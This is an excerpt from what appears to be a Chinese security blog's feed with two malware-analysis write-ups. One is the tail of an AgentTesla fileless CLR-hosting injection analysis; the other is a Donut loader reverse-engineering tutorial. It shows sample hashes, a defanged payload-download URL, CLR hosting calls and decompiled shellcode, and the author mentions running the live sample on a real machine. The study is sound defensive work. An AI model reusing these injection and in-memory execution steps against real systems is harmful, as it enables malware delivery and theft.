id="将程序集加载到-AppDomain："><a href="#将程序集加载到-AppDomain：" class="headerlink" title="将程序集加载到 AppDomain："></a>将程序集加载到 AppDomain：</h2><p>_AssemblyPtr managedAssembly &#x3D; 空；</p><p>defaultAppDomain-&gt;Load_3（safeArray，&amp;managedAssembly）</p><h2 id="找到已加载程序集的入口点："><a href="#找到已加载程序集的入口点：" class="headerlink" title="找到已加载程序集的入口点："></a>找到已加载程序集的入口点：</h2><p>_MethodInfoPtr pMethodInfo &#x3D; NULL;</p><p>managedAssembly-&gt;get_EntryPoint（&amp;pMethodInfo）</p><h2 id="调用入口点："><a href="#调用入口点：" class="headerlink" title="调用入口点："></a>调用入口点：</h2><p>pMethodInfo-&gt;Invoke_3(VARIANT()、SafeArray_Pointer_To_Arguement、&amp;VARIANT())</p><p>“Invoke_3”函数的第二个参数是指向将传递给 MSIL 有效负载的参数的 SafeArray 指针。</p><h1 id="ShellCode-使用-CLR-托管从本机代码执行托管代码"><a href="#ShellCode-使用-CLR-托管从本机代码执行托管代码" class="headerlink" title="ShellCode 使用 CLR 托管从本机代码执行托管代码"></a><strong>ShellCode 使用 CLR 托管从本机代码执行托管代码</strong></h1><p>接下来，shellcode 调用 mscoree.dll 中的“CLRCreateInstance” API。CLRCreateInstance API 返回新的 CLR MetaHost 实例，恶意软件将使用该实例准备运行时，以便在内存中执行 MSIL AgentTesla Payload。</p><p>我们可以从下图中看到，在检索 CLR 托管接口时使用了多个 GUID，例如，为了检索“ICorRuntimeHost”接口，它将“CLSID_CorRuntimeHost”、“IID_ICorRuntimeHost”作为参数传递给“GetInterface”API。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-7-GUID-used-while-CLR-hosting.png" alt="img"></p><p>图 7：CLR 托管时使用的 GUID</p><p>接下来，shellcode 检索 ICorRuntimeHost 接口并启动 CLR。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-8-Call-to-GetInterface-API-to-retrieve-the-ICorRuntimeHost-interface-1030x397.png" alt="Figure-8-Call-to-GetInterface-API-to-retrieve-the-ICorRuntimeHost-interface-1030x397"></p><p>图 8：调用 GetInterface API 来检索 ICorRuntimeHost 接口</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250823120018642.png" alt="image-20250823120018642"></p><p>图 9：从 ICorRuntimeHost 接口调用 start 方法来启动 CLR</p><p>接下来，shellcode 检索当前进程的默认应用程序域，如下所示。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-10-Retrieve-the-default-AppDomain-for-the-current-process-1030x249.png" alt="img"></p><p>图 10：检索当前进程的默认 AppDomain。</p><p>接下来，shellcode 使用“SafeArrayCreate” API 创建 SafeArray，并将托管代码的大小设置为 0x3CC00。此 SafeArray 包含一个指向缓冲区的指针，恶意软件会将 MSIL Payload 复制到该缓冲区中。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-11-Create-a-SafeArray-and-copy-AgentTesla-payload-to-it-1030x534.png" alt="img"></p><p>图 11：创建 SafeArray 并将 AgentTesla Payload 复制到其中</p><p>一旦创建了 SafeArray，就可以使用“Load_3”方法将其加载到 AppDomain 中，此“Load_3”方法提供指向 Assembly 对象的指针。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-12-Calls-Load_3-method-to-load-the-SafeArray-into-AppDomain-1030x254.png" alt="img"></p><p>图 12：调用“Load_3”方法将 SafeArray 加载到 AppDomain 中</p><p>接下来，shellcode 将解密区域中的 MSIL 有效负载清零，然后使用“SafeArrayDestroy”API 销毁 SafeArray。</p><p>最后，shellcode 检索程序集的入口点并调用“Invoke_3”方法在 64 位本机进程上下文中启动 32 位 MSIL AgentTesla 进程。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-13-starts-the-MSIL-AgentTesla-process-1030x220.png" alt="img"></p><p>图 13：启动 MSIL AgentTesla 进程</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-14-Browser-folder-enumerated-by-64-bit-process-once-the-fileless-managed-code-injection-has-been-done-1030x507.png" alt="img"></p><p>图 14：无文件托管代码注入完成后，64 位进程枚举的浏览器文件夹</p><p>在上图 14 中，看起来 64 位进程正在枚举浏览器文件夹，但其 AgentTesla 恶意软件在 .NET 引擎内开始执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;SonicWall Capture Labs 威胁研究团队在本机 64 位进程中观察到无文件 .Net 托管代码注入。本机代码或非托管代码是</summary>
      
    
    
    
    <category term="恶意样本分析" scheme="https://250wuyifan.github.io/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="恶意样本分析" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>针对dount的一次恶意样本分析</title>
    <link href="https://250wuyifan.github.io/2025/08/18/%E9%92%88%E5%AF%B9dount%E7%9A%84%E4%B8%80%E6%AC%A1%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/18/%E9%92%88%E5%AF%B9dount%E7%9A%84%E4%B8%80%E6%AC%A1%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2025-08-18T08:55:07.000Z</published>
    <updated>2025-08-22T07:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-Mega-Malware-Analysis-Tutorial-Featuring-Donut"><a href="#A-Mega-Malware-Analysis-Tutorial-Featuring-Donut" class="headerlink" title="A Mega Malware Analysis Tutorial Featuring Donut"></a>A Mega Malware Analysis Tutorial Featuring Donut</h1><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sha256如下</span><br><span class="line"></span><br><span class="line">1d450fb80ff070385e88ab624a387d72abd9d9898109b5c5ebd35c5002223359</span><br></pre></td></tr></table></figure><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>我们可以使用UNIX&#x2F;Windows的FILE程序来看文件类型，输出“PE32可执行文件（GUI）Intel 80386 Mono&#x2F;.Net程序集，用于MS Windows”表明我们的样本是.NET程序集</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818170429830.png" alt="image-20250818170429830"></p><p>.NET程序集是一种通过编译.NET语言（如C#）代码生成的DLL或EXE文件。不过，它并不包含本地x86&#x2F;x64机器码，而是使用MSIL（微软中间语言）字节码。这些MSIL由.NET运行时执行，并在运行时将其编译为本地代码。</p><p>分析这类文件的利器当属dnSpy——这款集.NET调试器、汇编编辑器和反编译器功能于一身的工具。当我们把示例文件加载到dnSpy时，会立即发现某些函数和对象的名称变成了\u0001、\u0002等乱码字符，而非人类可读的名称。这表明该示例文件已被混淆处理。需要说明的是，文件混淆本身并不具有恶意属性，企业通常会通过混淆技术来保护知识产权。不过，这种现象仍值得我们特别留意。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818173117091.png" alt="image-20250818173117091"></p><p>我们将使用de4dot工具，该工具用于检测常见的混淆器并清理.NET二进制文件。通过将二进制文件拖放到de4dot.exe中。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818174552590.png" alt="image-20250818174552590"></p><p>目前我们已完成对样本的初步分类。通过文件分析、dnSpy和de4dot工具，我们确认该样本为.NET程序集，检测到其存在混淆处理，并完成了反混淆操作。在完成反混淆处理后，现在可以开始深入分析这段代码了。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818174735236.png" alt="image-20250818174735236"></p><h3 id="使用类型引用来推断功能"><a href="#使用类型引用来推断功能" class="headerlink" title="使用类型引用来推断功能"></a>使用类型引用来推断功能</h3><p>在 <strong>dnSpy</strong> 中，<strong>程序集的类型引用（Type References）</strong> 是指当前被分析的程序集（Assembly）所依赖的其他外部类型（如类、接口、结构体等），其实看这个就类似于ida看导入函数一样。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818175742236.png" alt="image-20250818175742236"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818180624704.png" alt="image-20250818180624704"></p><p>如果单击Mcwpgr，将转到其函数定义，在那里我们可以看到对HttpClient的调用。</p><p>我们可以看到，该示例创建了一个HTTP客户端，并从hxxps：&#x2F;&#x2F;bitbucket[.]org&#x2F;veloncontinetaker&#x2F;utencilio&#x2F;downloads&#x2F;Tsudun[.]pdf.下载了有效载荷。通过静态分析检查类型引用，我们能够快速锁定示例中的有趣部分，而无需从入口点追溯代码。</p><h3 id="跟踪代码：解密有效载荷"><a href="#跟踪代码：解密有效载荷" class="headerlink" title="跟踪代码：解密有效载荷"></a>跟踪代码：解密有效载荷</h3><p>既然我们已经确定该示例尝试建立HTTP连接，我们希望进一步了解该示例试图下载的有效载荷。我们可以在dnSpy中设置断点并运行调试器来实现这一点</p><p>值得庆幸的是，分析时仍能获取有效载荷（SHA256哈希值：daba1c39a042aec4791151dbabd726e0627c3789deea3fc81b66be111e7c263e））。不过从文件扩展名来看，这似乎并非PDF格式——样本文件开头缺少预期的魔术字节（即文件签名，分析师常用来识别有效载荷类型）“25 50 44 46 2D”（或以“PDF-”开头）。实际上我们无法确定具体文件类型，因为既没有可识别的魔术字节，所有字符也都处于ASCII字符范围之内：<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818180749370.png" alt="image-20250818180749370"></p><p>我们需要重新检查反编译后的代码，以便更深入地了解有效载荷。如果我们跳出下载文件的方法，可以看到一个看似非常简单的字节转换，这可能是解密例程。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181056956.png" alt="image-20250818181056956"></p><p>然后就是查看此函数的调用，重复刚刚的分析，然后点击被使用，</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181735675.png" alt="image-20250818181735675"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181812557.png" alt="image-20250818181812557"></p><p>最后定位到这个，在此下断点，然后执行。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181836701.png" alt="image-20250818181836701"></p><p>现在我们就可以获取到，解密之后的shellcode了，然后进行下一步分析，分析到底程序做了什么。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818231041100.png" alt="image-20250818231041100"></p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818231443210.png" alt="image-20250818231443210"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818231915258.png" alt="image-20250818231915258"></p><p>这段代码展示了一个调用 <code>VirtualAlloc</code>Windows API 函数的间接过程。让我们逐步分析 <code>smethod_9</code>函数的功能：</p><p>1.<code>smethod_9</code>函数接收一个字节数组和一个 <code>Class2</code>对象作为参数，但实际上只使用了字节数组的长度信息。</p><p>2.它调用了 <code>smethod_4</code>函数，传递了以下参数：•</p><p>4096U (分配内存的区域类型，通常是 MEM_COMMIT)</p><p>•IntPtr.Zero (让系统决定分配地址)</p><p>•byte_0.Length (要分配的内存大小)</p><p>•4U (内存保护标志，PAGE_READWRITE)</p><p>3.在 <code>smethod_4</code>内部：</p><p>•创建了一个参数数组</p><p>•动态解析了 “VirtualAlloc” API 函数名（通过字符串替换去掉了点号）</p><p>•从 kernel32.dll 调用这个函数</p><p>4.最终效果等同于直接调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void* ptr = VirtualAlloc(NULL, byte_0.Length, MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure><p>所以 <code>smethod_9</code>的功能是：<strong>在进程的虚拟地址空间中保留并提交一块可读写的内存区域</strong>，内存大小等于传入字节数组的长度，返回分配的内存地址指针。</p><p>这种间接调用方式（通过字符串混淆和动态解析）通常出现在混淆&#x2F;保护过的代码中，可能是为了防止简单的字符串搜索识别出 API 调用。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818233308475.png" alt="image-20250818233308475"></p><p>根据文档说明，Marshal方法会将指定长度的字节副本复制到由提供的指针指向的内存区域。在本例中，该操作将解密后的有效载荷字节副本复制到刚通过VirtualAlloc分配的内存区域。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818233527345.png" alt="image-20250818233527345"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818233513834.png" alt="image-20250818233513834"></p><p>总之，我们会将最近分配的内存标记为PAGEExecuteRead。这表明，复制到已分配内存中的解密有效载荷最终会被执行，这意味着从互联网下载的有效载荷实际上是shellcode，无论在内存中的位置如何，都可以运行。</p><h3 id="静态分析总结"><a href="#静态分析总结" class="headerlink" title="静态分析总结"></a>静态分析总结</h3><p>本节总结如下：1.使用文件工具确认样本为.NET程序集；2.通过de4dot工具解除混淆处理；3.利用dnSpy检测到样本从互联网下载有效载荷；4.运用dnSpy调试功能完成有效载荷的下载与解密；5.确认样本将解密后的有效载荷加载至内存并执行。</p><h2 id="调试本地代码的执行"><a href="#调试本地代码的执行" class="headerlink" title="调试本地代码的执行"></a>调试本地代码的执行</h2><p>开头先介绍一下**托管代码（managed code）与非托管代码（unmanaged code）**的概念。微软提供的这份资料是一个很好的入门指南，但简单来说：</p><p>•托管代码**（通常用 C# 等语言编写）运行在**公共语言运行时（CLR）环境中，由 CLR 负责内存管理和安全性。</p><p>•非托管代码（通常用 C 或 C++ 编写）则直接由操作系统执行，因此需要程序手动管理内存。</p><p>之所以提到这一点，是因为该样本的执行已从<strong>托管代码切换到了非托管代码</strong>。在上一节中，我们观察到样本在运行时环境中下载了一个有效负载（payload），将其写入内存，并将指向该内存的指针转换为委托（delegate）后调用。</p><p>在此之前，我们还能用 <strong>dnSpy</strong> 单步调试托管代码，但由于执行跳转到了非托管代码，我们失去了对样本执行流的可见性，也无法再用 dnSpy 的调试器控制其执行。接下来，我们需要想办法使用<strong>原生调试器（如 x64dbg）附加到进程</strong>，以便分析shellcode行为。</p><h3 id="开始调试分析shellcode"><a href="#开始调试分析shellcode" class="headerlink" title="开始调试分析shellcode"></a>开始调试分析shellcode</h3><p>我们首先将样本加载到x64dbg中，然后在kernel32上设置断点。通过选择“符号”选项卡&gt;在模块搜索栏中输入‘kernel32.dll’&gt;在符号搜索栏中输入‘VirtualProtect’&gt;右键单击‘VirtualProtect’&gt;点击‘切换断点’</p><p>这个逆向的过程依靠更多的还是经验。初次看的时候我看不到，所以这里写详细一点，写如何依靠的AI。</p><p>是这个断点，里面写的参数先不说了，是根据dnspy里面函数调用情况，加断点调试，是这个参数，设置内存保护属性的，下到这个断点的时候，我们看一下堆栈情况（使用虚拟机的时候很慢很慢，因为前面有一个访问外网某网址获取shellcode的地方）</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819182443590.png" alt="image-20250819182443590"></p><p>我直接真机上了，很快。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819183105151.png" alt="image-20250819183105151"></p><p>看右下角堆栈，结合函数原型。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819183613364.png" alt="image-20250819183613364"></p><p>在 <strong>x86架构</strong> 中，参数通过栈传递（从右向左压栈），调用后的堆栈布局如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ESP+<span class="number">00</span>] 返回地址 (Return Address)</span><br><span class="line">[ESP+<span class="number">04</span>] lpAddress</span><br><span class="line">[ESP+<span class="number">08</span>] dwSize</span><br><span class="line">[ESP+<span class="number">0</span>C] flNewProtect</span><br><span class="line">[ESP+<span class="number">10</span>] lpflOldProtect</span><br></pre></td></tr></table></figure><p>所以这个位置就是设置内存保护这块的地址，也就是之前开辟的一块内存的存放着shellcode，给了权限之后进行执行的，这个之前在使用dnspy的时候已经知道流程了，现在我们去这个内存里面看一下情况。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819183701243.png" alt="image-20250819183701243"></p><p>下断点，然后运行进行跳转到shellcode</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184125406.png" alt="image-20250819184125406"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184150588.png" alt="image-20250819184150588"></p><p>上面下断点不好用，下面的直接硬件断点。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184851021.png" alt="image-20250819184851021"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184928111.png" alt="image-20250819184928111"></p><p>现在就是shellcode的代码了，可以把这一块内存导出文件，使用ida查看。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819185055196.png" alt="image-20250819185055196"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819185233019.png" alt="image-20250819185233019"></p><p>x64dbg调试一下，进入这个call。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819185442799.png" alt="image-20250819185442799"></p><p>看着像是在执行一个函数之前的操作，我们直接去ida打开刚刚存储的bin然后进行搜索字节，定位到这个7C9B函数（顶部菜单栏中的“搜索”&gt;“下一个字节序列”）：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819101958888.png" alt="image-20250819101958888"></p><p>这里我们可以知道动态调试是call 0xxx7C9B，ida是sub_xx7C9B,这个关联可以让我们更好的知道我们在看哪个函数，动静结合,如下是这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __usercall sub_107C9B@&lt;eax&gt;(<span class="type">int</span> a1@&lt;ebx&gt;, <span class="type">int</span> a2@&lt;ebp&gt;, <span class="type">int</span> a3@&lt;edi&gt;, <span class="type">int</span> a4@&lt;esi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v4; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> (__cdecl *func_ptr)(_DWORD); <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> func_ptr_1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (__cdecl *func_ptr_3)(<span class="type">int</span>); <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> (__cdecl *func_ptr_4)(_DWORD *); <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp-24h] [ebp-31Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-4h] [ebp-2FCh]</span></span><br><span class="line">  _DWORD *v16; <span class="comment">// [esp+0h] [ebp-2F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> func_ptr_2; <span class="comment">// [esp+4h] [ebp-2F4h]</span></span><br><span class="line">  _DWORD v18[<span class="number">46</span>]; <span class="comment">// [esp+8h] [ebp-2F0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+C4h] [ebp-234h]</span></span><br><span class="line">  _DWORD *v20; <span class="comment">// [esp+2F0h] [ebp-8h]</span></span><br><span class="line">  _DWORD *v21; <span class="comment">// [esp+2F4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = v21;</span><br><span class="line">  v21 = v20;</span><br><span class="line">  v20 = v4;</span><br><span class="line">  v18[<span class="number">4</span>] = a1;</span><br><span class="line">  v18[<span class="number">3</span>] = a2;</span><br><span class="line">  v18[<span class="number">2</span>] = a4;</span><br><span class="line">  v5 = v21;</span><br><span class="line">  v18[<span class="number">1</span>] = a3;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v21[<span class="number">142</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    func_ptr = (<span class="type">int</span> (__cdecl *)(_DWORD))sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">34</span>], v21[<span class="number">35</span>], v21[<span class="number">10</span>], v21[<span class="number">11</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( !func_ptr )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    v18[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    func_ptr_2 = <span class="number">0</span>;</span><br><span class="line">    v16 = v21;</span><br><span class="line">    v15 = sub_10A31A() - <span class="number">5028</span>;</span><br><span class="line">    v6 = func_ptr(<span class="number">0</span>);</span><br><span class="line">    func_ptr_1 = sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">130</span>], v21[<span class="number">131</span>], v21[<span class="number">10</span>], v21[<span class="number">11</span>]);</span><br><span class="line">    v14 = v21[<span class="number">11</span>];</span><br><span class="line">    func_ptr_2 = func_ptr_1;</span><br><span class="line">    func_ptr_3 = (<span class="type">void</span> (__cdecl *)(<span class="type">int</span>))sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">40</span>], v21[<span class="number">41</span>], v21[<span class="number">10</span>], v14);</span><br><span class="line">    func_ptr_4 = (<span class="type">int</span> (__cdecl *)(_DWORD *))sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">42</span>], v21[<span class="number">43</span>], v21[<span class="number">10</span>], v21[<span class="number">11</span>]);</span><br><span class="line">    func_ptr_2 = ((<span class="type">int</span> (__cdecl *)(_DWORD))v21[<span class="number">14</span>])(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v21 &amp;&amp; func_ptr_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( func_ptr_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v18[<span class="number">0</span>] = &amp;byte_10007;</span><br><span class="line">        v11 = func_ptr_4(v18);</span><br><span class="line">        func_ptr_3(v11);</span><br><span class="line">        v12 = v15 + v5[<span class="number">142</span>];</span><br><span class="line">        v19 &amp;= <span class="number">0xFFFFFFFC</span>;</span><br><span class="line">        v18[<span class="number">44</span>] = v12;</span><br><span class="line">        ((<span class="type">void</span> (__cdecl *)(_DWORD **, _DWORD))unk_0)(&amp;v16, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_108F76(v21);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先执行一下动态的，看看他做了什么，F8步过到这个地方了。8F76函数，我们看一下ida，这不就是最下面的函数吗，说明最外层的if没有过。if ( v21[142] )</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190228409.png" alt="image-20250819190228409"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190314796.png" alt="image-20250819190314796"></p><p>然后我们ida进入这个8F76函数看一下。看到前面都是调用了sub_10A51D函数。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190447856.png" alt="image-20250819190447856"></p><p>直接把这个sub_10A51D丢给AI问一下。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190809654.png" alt="image-20250819190809654"></p><p>然后接动态调试。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190854271.png" alt="image-20250819190854271"></p><p>执行完了第一个 <strong><code>sub_10A51D</code></strong></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191156212.png" alt="image-20250819191156212"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191228668.png" alt="image-20250819191228668"></p><p>后面的也是一样无非就是获取函数地址不一样，我们这里先去IDA给这个函数标记上。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191347102.png" alt="image-20250819191347102"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191549686.png" alt="image-20250819191549686"></p><p>他前面调用的三个这个函数，我们快速在动态调试里面拿到返回值，在ida标记他调用了哪些函数，然后进行改名。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191857176.png" alt="image-20250819191857176"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191920695.png" alt="image-20250819191920695"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192139655.png" alt="image-20250819192139655"></p><p>我们将向前推进，直到到达下一个功能，申请了一块内存。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192250261.png" alt="image-20250819192250261"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192351165.png" alt="image-20250819192351165"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192605681.png" alt="image-20250819192605681"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192643119.png" alt="image-20250819192643119"></p><p>我们在ida也进行一个重命名，一个申请的内存空间。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192814748.png" alt="image-20250819192814748"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193119151.png" alt="image-20250819193119151"></p><p>给x64dbgt也标记一下。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193442660.png" alt="image-20250819193442660"></p><p>然后进行下面的调试。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193530011.png" alt="image-20250819193530011"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193542605.png" alt="image-20250819193542605"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193929199.png" alt="image-20250819193929199"></p><p>这个函数 <code>sub_10A992</code>是一个 <strong>内存数据复制函数</strong>，其作用是将源地址 (<code>a2</code>) 的数据复制到目标地址 (<code>a1</code>)，复制的长度为 <code>a3</code>字节。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194038086.png" alt="image-20250819194038086"></p><p>  sub_10A9B6(v31, 0, 32);</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194311382.png" alt="image-20250819194311382"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194340317.png" alt="image-20250819194340317"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194428623.png" 